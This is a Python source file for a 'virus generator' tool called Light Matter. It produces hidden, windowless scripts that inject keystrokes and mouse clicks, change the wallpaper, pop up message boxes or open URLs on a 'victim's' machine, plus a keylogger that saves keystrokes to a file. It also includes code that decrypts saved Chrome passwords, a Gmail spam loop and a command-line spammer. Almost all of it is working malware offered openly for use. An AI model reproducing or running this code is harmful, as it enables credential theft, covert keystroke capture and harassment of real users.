
import os
import socket
try:
    import pynput
except ImportError:
    print("Pynput not found. Installing.")
    os.system("py -m pip install pynput")
try:
    import imp
except ImportError:
    print("imp not found. Installing.")
    os.system("py -m pip install imp")

from os import getenv
import sqlite3

try:
    import win32crypt
except ImportError:
    os.system("py -m pip install pypiwin32")

import smtplib
import time


os.system("cls")
print("""\033[1;35;40m 

                        _    _      _   _           __  __      _   _                      
            _/\_       | |  (_)__ _| |_| |_   ___  |  \/  |__ _| |_| |_ ___ _ _        _/\_
            >  <       | |__| / _` | ' \  _| |___| | |\/| / _` |  _|  _/ -_) '_|       >  <
             \/   ___  |____|_\__, |_||_\__|       |_|  |_\__,_|\__|\__\___|_|    ___   \/ 
                 |___|        |___/                                              |___| 

                           || An Essential Program made for the Learning one ||  
                            ----------- || Version 2 || -------------
    """)

def __main__():
    #Definations.

    def MagicText():
        file = input("[!] Enter File Name (Enter ONLY name not it's TYPE! Eg : file | not file.txt) : ")
        virus = open(file+".pyw", "w")
        text = input("[!] Enter MagicText  : ")
        #CREATE VIRUS
        virus.write("from pynput.keyboard import Key, Controller \n")
        virus.write("import time\n")
        virus.write("while True :\n")
        virus.write("   msg = '"+text+"'\n")
        virus.write('   time.sleep(10)\n')
        virus.write("   keyboard = Controller()\n")
        virus.write("   keyboard.type(msg)")
        virus.close()
       
        print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
        
        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
        if(exe == "Y" or "y"):
            os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
            print("\033[1;33;40mVirus Script Compiled Successfully.")
            __main__()
        elif(exe == "N" or "n"):
            print("\033[1;34;40m[+] Virus has been Created.")
            __main__()
        else:
            print("\033[1;31;40m[-] Error")
            input("")
            __main__()


    def MagicDesktop():
        file = input("[!] Enter File Name (Enter ONLY name not it's TYPE! Eg : file | not file.txt) : ")
        virus = open(file+".pyw", "w")
        virus.write("import ctypes, time\n")
        virus.write("while True:\n")
        virus.write("   time.sleep(20)\n")
        virus.write("   SPI_SETDESKWALLPAPER = 20\n")
        virus.write("   ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, 'image.jpg' , 0)")
        virus.close()
        print("[!] MagicDesktop Virus is Generated. Put your Background Image in the Same folder as MagicDesktop-Virus AND NAME IT \033[1;39;40mimage \033[1;32;40mit will Work in 20 Seconds..")
        print("[!] FILE EXITS",os.path.isfile(file+".pyw"))

        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
        if(exe == "Y" or "y"):
            os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
            print("\033[1;33;40mVirus Script Compiled Successfully.")
            __main__()
        elif(exe == "N" or "n"):
            print("\033[1;34;40m[+] Virus has been Created.")
            __main__()
        else:
            print("\033[1;31;40m[-] Error")
            input("")
            __main__()


    def MagicClicks():
        file = input("[!] Enter File Name (Enter ONLY name not it's TYPE! Eg : file | not file.txt) : ")
        virus = open(file+".pyw", "w")

        #CREATE VIRUS
        virus.write("from pynput.mouse import Button, Controller \n")
        virus.write("import time\n")
        virus.write("while True :\n")
        virus.write('   time.sleep(5)\n')
        virus.write("   mouse = Controller()\n")
        virus.write("   mouse.click(Button.left, 2)")
        virus.close()
       
        print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
        if(exe == "Y" or "y"):
            os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
            print("\033[1;33;40mVirus Script Compiled Successfully.")
            __main__()
        elif(exe == "N" or "n"):
            print("\033[1;34;40m[+] Virus has been Created.")
            __main__()
        else:
            print("\033[1;31;40m[-] Error")
            input("")
            __main__()

    def TrollText():
        file = input("[!] Enter File Name (Enter ONLY name not it's TYPE! Eg : file | not file.txt) : ")
        virus = open(file+".pyw", "w")

        title = input("[*] Enter MessageBox Title : ")
        BoxText = input("[!] Enter MessageBox Text : ")
        #CREATE VIRUS
        virus.write("from tkinter import messagebox\n")
        virus.write("from tkinter import *\n")
        virus.write("import time\n")
        virus.write("root = Tk()\n")
        virus.write("root.withdraw()\n")
        virus.write("while True:\n")
        virus.write("  time.sleep(10) \n")
        virus.write("  messagebox.showinfo('"+title+"','"+BoxText+"')")
        virus.close()
       
        print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
        if(exe == "Y" or "y"):
            os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
            print("\033[1;33;40mVirus Script Compiled Successfully.")
            __main__()
        elif(exe == "N" or "n"):
            print("\033[1;34;40m[+] Virus has been Created.")
            __main__()
        else:
            print("\033[1;31;40m[-] Error")
            input("")
            __main__()


    def TrollURL():
        file = input("[!] Enter File Name (Enter ONLY name not it's TYPE! Eg : file | not file.txt) : ")
        virus = open(file+".pyw", "w")

        url = input("[!] Enter URL  : ")
        virus.write("import webbrowser\n")
        virus.write("import time\n")
        virus.write("def openURL():\n")
        virus.write("  time.sleep(60)\n")
        virus.write("  webbrowser.open('"+url+"')\n")
        virus.write("  time.sleep(30)\n")
        virus.write("while True:\n")
        virus.write("  openURL()\n")
        virus.close()
        print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
        if(exe == "Y" or "y"):
            os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
            print("\033[1;33;40mVirus Script Compiled Successfully.")
            __main__()
        elif(exe == "N" or "n"):
            print("\033[1;34;40m[+] Virus has been Created.")
            __main__()
        else:
            print("\033[1;31;40m[-] Error")
            input("")
            __main__()

    def txtKeylog():
        file = input("[!] Enter file name (Enter ONLY file name not it's TYPE! Eg : file | not file.txt) : ")
        virus = open(file+".pyw", "w")
        virus.write("from pynput.keyboard import Key, Listener\n")
        virus.write("import logging\n")


        virus.write("log = ''\n")

        virus.write("logging.basicConfig(filename=(log + 'keylog.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')\n")

        virus.write("def on_press(key):\n")
        virus.write("    logging.info(key)\n")

        virus.write("with Listener(on_press=on_press) as listener:\n")
        virus.write("    listener.join()")
        virus.close()

        print("[*] FILE EXITS",os.path.isfile(file+".pyw"))
        exe = input("\033[1;36;40m[?] Compile File now?(Requires pyinstaller) (Y/N) : ")
        if(exe == "Y" or "y"):
            os.system("pyinstaller "+file+".pyw -w --noconsole --onefile")
            print("\033[1;33;40mVirus Script Compiled Successfully.")
            __main__()
        elif(exe == "N" or "n"):
            print("\033[1;34;40m[+] Virus has been Created.")
            __main__()
        else:
            print("\033[1;31;40m[-] Error")
            input("")
            __main__()

    def virus():
        print("[+] Available Modules : ")
        print("\033[1;37;40mSelect Virus Type : ")
        print("\033[1;34;40m[*] All the Stuff for People Learning :")
        print("\033[1;33;40m[1] MagicText - Automatically Writes Text every 10 Seconds to Scare the shit out of Victim.")
        print("[2] MagicDesktop - Automatically Changes Desktop Wallpaper from time to time.")
        print("[3] MagicClicks - Automatically Right/Left Click to Scare the shit out of Victim.")
        print("[4] TrollText - Display random Message Boxes")
        print("[5] TrollURL - Automatically open a Specified URL.")
        print("[6] Normal log to .txt Keylogger")
        print("\033[1;34;40m[*] For Hackers : ")
        print("\033[1;33;40m[7] Anti-Chrome - Decrypt your Chrome Passwords.")
        print("[8] Ded Virus Command Line Spammer - Python Version.")
        print("[9] Email Spammer - GMAIL")
        print("[10] A Fake 'You've BEEN HACKED' Application with Graphical User Interface.")
        print("\033[1;34;40m[*] Local and Remote Exploits : ")
        print("\033[1;33;40m[*] Coming in Version 3.")
        type = input("\033[1;32;40mFastCorp>\033[1;37;40m$~/Virus Type : \033[1;32;40m")
        if(type == "1"):
            print("[*] You have selected type MagicText.")
            print("[+] Now starting Virus Generation.")
            MagicText() 
        elif(type == "2"):
            print("[*] You have selected type MagicDesktop.")
            print("[+] Now starting Virus Generation.")
            MagicDesktop()
        elif(type == "3"):
            print("[*] You have selected type MagicClicks.")
            print("[+] Now starting Virus Generation.")
            MagicClicks()
        elif(type == "4"):
            print("[*] You have selected type TrollText.")
            print("[+] Now starting Virus Generation.")
            TrollText()
        elif(type == "5"):
            print("[*] You have Selected TrollURL.")
            print("[+] Now starting Virus Generation.")
            TrollURL()
        elif(type == "6"):
            print("[*] You have Selected LogToText Keylogger.")
            print("[+] Now starting Virus Generation.")
            txtKeylog()

        elif(type == "7"):
            print("[+] Make sure Chrome is off!")
            print("[+] This isn't exactly a Virus.")
            print("[+] A Email Sending Virus available on GitHub that you can send to your Victim and get his passwords.")
            check = input("[!] We Cool? (Y/N) :")
            if(check == "Y" or "y"):
                print("[!] OK! Now Proceeding..")
                sysname = socket.gethostname()
                conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data") 
                cursor = conn.cursor()
                cursor.execute('Select action_url, username_value, password_value FROM logins')
                passfile = open(sysname+".txt", "w")
                passfile.write("Chrome Saved Passwords From PC : "+sysname+"\n")
                for result in cursor.fetchall():
                    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
                    if password:
                        passfile.write('\nThe website is '+result[0])
                        passfile.write('\nThe Username is '+result[1])
                        passfile.write('\n The password is ' + str(password))
                    
                
                
                print("[+] Done!")
                input("")
                __main__()
            elif(check == "n" or "N"):
                print("[+] Ok.")
                input("")
        elif(type == "8"):
            print("[*] You have Selected Ded Virus.")
            print("\033[1;37;40m[!] When Generated Read the Code of this Virus.")
            file = open("ded.py", "w")
            file.write("#DED VIRUS - Python Version.\n")
            file.write("# Command Line Spammer.\n")
            file.write("import os\n")

            file.write("os.system('color a')\n")

            file.write("while True:\n")
            file.write('   os.system("pause")\n')
            file.write('   os.system("start ded.exe") # Edit here if you wish to compile.\n')
            file.close()
            input("[+] Done")
            __main__()

        elif(type == "9"):
            print("[*] This isn't exactly a Virus.")
            print("[*] You have Selected Email Spammer.")

            
            email = input("[+] Enter SENDER's EMAIL : ")
            password = input("[+] Enter SENDER's Password : ")
            email2 = input("[+] Enter Target's EMAIL : ")

            msg = input("[!] Enter Message : ")

            try:
                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.connect('smtp.gmail.com', 587)  
                server.ehlo()
                server.starttls()
                server.ehlo()
                #Login Smtp Server
                server.login(email, password)
            except smtplib.SMTPConnectError as msg:
                print("[-] Error : ", msg)
                input("[*] Try again.")
                __main__()
            
        
            try:
                print("-----------------------")
                print("EMAIL FROM : ", email)
                print("EMAIL TO : ", email2)
                print("EMAIL MESSAGE : ", msg)
                print("-----------------------")
                print("[!] Now Spamming Email. Press Ctrl + C to Stop.")
                while True:
                    time.sleep(1)
                    server.sendmail(email, email2, msg)
                
            except KeyboardInterrupt:
                input("[!] Finished.")
                __main__()
            except smtplib.SMTPServerDisconnected as er:
                print("[-] Error : ", er)
                input("[*] Try Again.")
                __main__()  
        elif(type == "10"):
            print("[*] You have Selected Fake GUI Hack Application.")
            print("[!] An Unlock key is Required.")
            unlock_key = input("[?] Enter Unlock key : ")

            keyFile = open("key", "w+")
            keyFile.write(unlock_key)
            keyFile.close()

            print("[+] Program Available in Root Folder of Light Matter.")
            input("[!] Done.")
            __main__()
            
        else:
            print("[-] Invalid Option.")
            __main__()

    #All the Work THIS IS __MAIN__
    cmd = input("\033[1;32;40mFastCorp>")
    if(cmd == "help"):
        print("[*] Troll-Virus-Generator")
        print("[+] HELP : ")
        print("[+] help - Print this help message")
        print("[+] virus - Start Virus Generation.")
        print("[+] info - Display information")
        print("[+] exit - Obvious.")
        __main__()
    elif(cmd == "virus"):
        virus()
    elif(cmd == "exit"):
        SystemExit()
        exit
    elif(cmd == "info"):
        print("*_ Light Matter _*")
        print("Coded by : F.A.S.T")
        input("")
        __main__()
    else:
        print("[-] Invalid Option.")
        __main__()



if __name__ == __main__():
    '__main__'


